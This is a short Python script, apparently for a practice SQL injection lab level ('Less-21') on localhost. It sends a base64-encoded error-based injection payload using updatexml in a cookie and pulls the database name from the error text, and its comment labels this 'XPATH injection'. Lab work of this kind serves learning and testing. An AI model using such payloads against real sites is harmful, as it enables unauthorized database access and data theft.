import re
import string
import requests

url='http://localhost/Less-21/'

# XPATH injection
# Error based injection

# base64 encoding of this payload 
# ') and updatexml(1,concat('==',(select database()),'=='),1)#

cookies={
	"uname":"JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgnPT0nLChzZWxlY3QgZGF0YWJhc2UoKSksJz09JyksMSkj"
}

resp=requests.get(url,cookies=cookies)
# print(resp.text)
matches=re.findall("error: '==(.*)==",resp.text)
print(matches)